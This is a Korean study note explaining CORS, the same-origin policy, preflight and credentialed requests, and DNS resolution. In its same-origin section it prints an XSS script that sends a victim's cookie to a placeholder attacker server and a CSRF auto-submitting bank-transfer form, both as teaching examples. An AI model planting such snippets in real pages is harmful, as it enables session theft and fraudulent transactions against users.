# **교차 출처 리소스 공유**(Cross-Origin Resource Sharing, CORS)

### CORS란?

CORS는 교차 출처 자원 공유의 줄임말로, <u>동일한 출처가 아니라면 리소스 공유에 제한을 두는 것이 웹 시큐리티 정책(SOP)</u>이지만, **허용된 origin의 경우의 한 해서 자원을 공유하는 것을 허용하도록 하는 매커니즘**을 의미한다.

#### Origin(출처)

![uri structure](https://evan-moon.github.io/static/e25190005d12938c253cc72ca06777b1/6af66/uri-structure.png)

출처는 서버의 위치를 찾아가기 위해 필요한 기본적인 것을 합쳐놓은 것으로 `프로토콜`과 `호스트`, `포트 번호`까지 일치해야만 동일한 출처로 인정된다. 포트 번호가 포함된다는 점에서 도메인과 차이가 있다.

#### 동일 출처 정책(Same-Origin Policy, SOP)

SOP는 지난 2011년, [RFC 6454](https://tools.ietf.org/html/rfc6454#page-5)에서 처음 등장한 보안 정책으로 말 그대로 “**같은 출처에서만 리소스를 공유할 수 있다**”라는 규칙을 가진 정책이다.

#### 왜 동일한 출처에서만 자원 공유를 허용하나?

http는 stateless라는 특징을 갖는다. 동일한 사용자의 요청이라도 매번 새로운 요청인 것처럼 처리한다. 같은 개념으로, 서버 입장에서는 브라우저에서 전송되는 http 메시지에 의존하여 실행되기 때문에 요청이 해커가 심은 악성코드의 요청인지, 진짜 사용자의 요청인지 구분할 수 없다.

동일한 출처만 자원 공유를 허용하게되면 다음 보안 이슈를 예방할 수 있다.

- **XSS(Corss Site Scripting)** : 공격자가 악의적인 스크립트를 신뢰할 수 있는 웹사이트에 삽입하는 방법의 공격. 

  - Ex) 해커가 웹사이트에 사용자(브라우저)의 쿠키 정보를 빼오는 javascript 코드를 집어넣음

    ```javascript
    <script>window.location = "http://해커의 웹서버주소/?cookie="+document.cookie</script>
    ```

    - 해커가 삽입한 악의적인 스크립트를 클릭하게 되면 해당 브라우저의 쿠키 정보가 해커의 웹 서버로 전송됨
    - 쿠키, 세션 탈취 우려

- **CSRF(Cross-Site Request Forgeries)** : 웹 어플리케이션의 유저가 의도하지 않은 처리를 웹 어플리케이션에서 실행되는 공격

  - Ex) 

    - 사용자가 은행사이트에 로그인한다. (www.mybank.com)
    - 새로운 탭을 눌러서 해커가 만든 웹페이지를 방문한다.(www.해커.com)
    - 해커의 웹페이지는 다음과 같이 코드를 넣어서 사용자의 은행 계좌에서 돈을 해커의 계좌로 입금 시키라는 요청을 보낸다.

    ```javascript
    <form action = "은행주소" method = POST>
      <input name = "받는사람" value = "해커 계좌">
      <input name = "금액" value = 1000>
    </form>
    <script>document.forms[0].submit()</script>
    ```

    - 은행 웹서버는 사용자의 브라우저 (chrome)에 저장되어 있는 사용자 인증 정보때문에 정상적인 사용자의 요청이라고 인식

실제 이 웹이라는 오픈된 환경에서 다른 출처의 자원을 가져와서 사용하는 일은 비일비재한데, 이 정책으로 그런 것을 전부 막는다는 것은 말도 안되는 일이기 때문에 몇가지 **예외적인 경우**를 두었고 그 중 하나가 바로 CORS 정책이다.

</br>

### CORS 동작 과정

#### 기본적인 과정

1. 클라이언트에서 요청 시, HTTP 요청 헤더에 `Origin`이라는 필드에 요청을 보내는 출처를 담아 보낸다.
2. 서버가 이 요청에 대한 응답을 할 때, 응답 헤더의 Access-Control-Allow-Origin 이라는 값에 리소스 접근이 허용된 출처를 보내준다.
3. 브라우저는 보냈던 요청의 `Origin`과 서버가 보내준 응답의 `Access-Control-Allow-Origin`을 비교하여 응답이 유효한 응답인지 아닌지를 결정

기본적인 흐름은 이렇게 간단하지만, 사실 CORS가 동작하는 방식은 한 가지가 아니라 세 가지의 시나리오에 따라 변경된다.

#### Preflight Request

요청을 한번에 보내지 않고 예비 요청과 본 요청으로 나누어서 서버로 전송하는 시나리오

![cors preflight](https://evan-moon.github.io/static/c86699252752391939dc68f8f9a860bf/6af66/cors-preflight.png)

- 예비 요청을 preflight라 부르고, 이 요청에는 OPTIONS 메소드가 사용된다.
- 예비 요청은 본 요청을 보내기 이전에 브라우저 자체에서 이 요청을 보내는 것이 안전한지 확인하기 위함이다.
- 예비 요청에서는 다음과 같은 본 요청에 대한 정보를 헤더에 담아 보낸다.
  - Origin : 요청하는 클라이언트의 출처
  - Access-Control-Request-Headers : 본 요청에 포함될 헤더 정보
  - Access-Control-Request-Method : 본 요청에서 사용할 HTTP 메소드
- 서버는 예비 요청의 응답에 Access-Control-Allow-Origin 헤더를 포함해 보낸다.
  - Access-Control-Allow-Origin에는 서버에서 허용하는 출처가 저장되어 있다.
  - 이 출처와 클라이언트의 출처가 다르면 CORS 에러가 발생하게 된다.

#### Simple Request

예비 요청을 보내지 않고 바로 서버에게 본 요청을 보내는 시나리오. 서버가 이에 대한 응답의 헤더에 `Access-Control-Allow-Origin`과 같은 값을 보내주면 그때 브라우저가 CORS 정책 위반 여부를 검사하는 방식

![simple request](https://evan-moon.github.io/static/d8ed6519e305c807c687032ff61240f8/6af66/simple-request.png)

다음과 같은 조건에 해당하는 경우에만 예비 요청 없이 본 요청을 바로 보낸다.

1. 요청의 메소드는 `GET`, `HEAD`, `POST` 중 하나여야 한다.
2. `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `DPR`, `Downlink`, `Save-Data`, `Viewport-Width`, `Width`를 제외한 헤더를 사용하면 안된다.
3. 만약 `Content-Type`를 사용하는 경우에는 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`만 허용된다.

#### Credential Request

인증된 요청을 사용하는 시나리오.  이 시나리오는 CORS의 기본적인 방식이라기 보다는 다른 출처 간 통신에서 좀 더 보안을 강화하고 싶을 때 사용하는 방법이다.

- 기본적으로 브라우저가 제공하는 비동기 리소스 요청 API(XMLHttpRequest)나 fetch API는 별도의 옵션 없이 브라우저의 쿠키 정보나 인증 관련 헤더를 요청에 담지 않는다. 
- 이때 요청에 인증과 관련된 정보를 담을 수 있게 해주는 옵션이 `credentials` 옵션이다.
  - same-origin(기본값) : 같은 출처 간 요청에만 인증 정보를 담을 수 있음
  - inclue : 모든 요청에 인증 정보를 담을 수 있다
  - omit : 모든 요청에 인증 정보를 담지 않는다.

- Credential request를 하게 되면(=요청에 인증 정보가 담겨있는 상태에서 다른 출처의 리소스를 요청하게 되면) 브라우저는 CORS 정책 위반 여부를 검사할 때 다음 두 가지를 추가하게 된다.
  1. `Access-Control-Allow-Origin`에는 `*`를 사용할 수 없으며, 명시적인 URL이어야한다.
  2. 응답 헤더에는 반드시 `Access-Control-Allow-Credentials: true`가 존재해야한다.

</br>

#### 모바일에서는 CORS 이슈를 어떻게 해결하나?

CORS의 요점은 한 도메인에서 로드된 웹 페이지가 AJAX 요청 또는 다른 도메인의 데이터를 수정하는 HTTP 요청을 만드는 것을 방지하는 것이다. 모바일 환경에서 작동하는 네이티브 앱은 도메인에서 로드된 웹 페이지가 아니기 때문에 CORS 제한이 필요하지 않거나 적용되지 않으며 앱의 HTTP 함수는 OPTIONS 프리 플라이트를 전송하지 않으며 서버는 CORS 이슈 없이 요청을 제공한다. 단, 하이브리드 모바일 앱을 사용하는 경우에는 CORS를 처리해야 한다.

</br>

#### [참고]

> - https://evan-moon.github.io/2020/05/21/about-cors/
> - https://velog.io/@sj950902/CORS%EC%99%80-SOP%EC%97%90-%EB%8C%80%ED%95%B4-%EC%95%8C%EC%95%84%EB%B3%B4%EC%9E%90-1%ED%83%84
> - https://developer.mozilla.org/ko/docs/Web/HTTP/CORS



---

# DNS(Domain Name Service)

인터넷은 서버들을 유일하게 구분할 수 있는 IP주소를 기본체계로 이용하는데 숫자로 이루어진 조합이라 인간이 기억하기에는 무리가 따른다. 따라서 DNS를 이용해 IP주소를 인간이 기억하기 편한 언어체계로 변환하는 작업이 필요한데 이 역할을 DNS가 하는 것이다.

#### DNS 수행 과정

1. 브라우저는 URL로부터 호스트 네임 www.naver.com를 추출하고 그 호스트 네임을 DNS 애플리케이션의 클라이언트 측에 넘긴다.

2. DNS 클라이언트는 DNS 서버로 호스트 네임을 포함하는 질의를 보낸다.

3. DNS 클라이언트는 결국 호스트 네임에 대한 IP 주소를 가진 응답을 받게 된다.

4. 브라우저가 DNS로부터 IP주소를 받으면, 브라우저는 그 IP주소와 그 주소의 80번 포트에 위치하는 HTTP 서버 프로세스로 TCP 연결을 초기화한다.

#### 도메인 이름의 체계

인터넷 도메인은 하나의 역트리 구조를 하고 있다.

![img](https://t1.daumcdn.net/cfile/tistory/2316A93F51C462940C)

- 인터넷 도메인의 체계에서 최상위는 루트(root)로서 인터넷 도메인의 시작이 된다.
- 루트 도메인 바로 아래 단계를 1단계 도메인이라 하며, 이를 최상위 도메인이라고 하다. 약어로 TLD(Top Level Domain)
- 최상위 도메인은 국가명을 나타내는 **국가 최상위 도메인**과 일반적으로 사용되는 **일반 최상위 도메인**으로 구분된다.

- 도메인을 구입할 경우 1단계 도메인 중에 하나를 선택하고 원하는 도메인명을 지정하여 등록한다.

#### 도메인 질의 과정

**1. 반복적 질의**

1) 로컬 DNS에게 요청을 함 -> 로컬은 해당 정보를 가지고 있지 않다면 루트 DNS 서버에게 요청하는 IP 알고 있냐고 물어봄

2) 루트 DNS는 자기는 모르지만 아마 최상위 DNS 서버(TLD)는 알고 있을 거라고 로컬 DNS에게 알려줌

3) 로컬 DNS는 다시 최상위 DNS 서버에게 질의함 알고 있냐고. -> 자기도 모르는데 책임 DNS 서버는 알고 있을 꺼라고 알려줌

4) 로컬 DNS는 책임 DNS 서버에게 알고 있냐고 물어봄 -> 책임 DNS는 알고 있기 때문에 해당 IP 주소를 알려줌

5) 로컬 DNS는 받아온 정보를 사용자에게 최종적으로 알려주고 자신의 DNS 레코드에 나중에 똑같은 요청에대한 신속한 처리를 위해 저장함

**2. 재귀적 질의**

1) 로컬 DNS에게 요청을 함 -> 로컬은 해당 정보를 가지고 있지 않다면 루트 DNS 서버에게 요청하는 IP 알고 있냐고 물어봄

2) 루트 DNS 서버는 모르기 때문에 최상위 DNS 서버에게 물어봄 알고 있냐고

3) 최상위 DNS 서버도 모르기 때문에 책임 DNS 서버에게 물어봄 알고 있냐고

4) 책임 DNS 서버는 알고 있기 때문에 알려줌. (최상위 DNS에게 다시)

5) 최상위 DNS는 받은 정보를 다시 루트 DNS에게 알려줌

6) 루트 DNS는 로컬 DNS에게 받은 정보를 알려줌

7) 로컬 DNS는 최종적으로 사용자에게 받은 정보를 전달하고 자신의 DNS 레코드에 해당 정보를 추가함.

#### DNS와 TCP/UDP

DNS는 기본적으로 UDP 프로토콜을 이용하지만 특수한 상황에서는 TCP를 이용해서 조금 더 안전성을 보장한다.

- DNS 포트 : 기본은 UDP/53, 특수한 상황에서는 TCP/53 사용
- UDP가 사용되는 경우 : 일반적인 DNS 질의 응답
- TCP가 사용되는 경우
  - Zone Transfer : 안정성을 위해 두 개 이상의 DNS 서버를 이용 시, DNS 서버 간 데이터베이스를 복제할 경우 안정성을 위해 사용
  - 메시지 사이즈가 512byte를 넘는 경우 tcp로 재질의하여 응답을 받음

</br>

#### [참고]

> - https://webdir.tistory.com/161
>
> - https://m.blog.naver.com/PostView.nhn?blogId=junhyung17&logNo=220506163514&proxyReferer=https:%2F%2Fwww.google.com%2F
> - https://wogh8732.tistory.com/24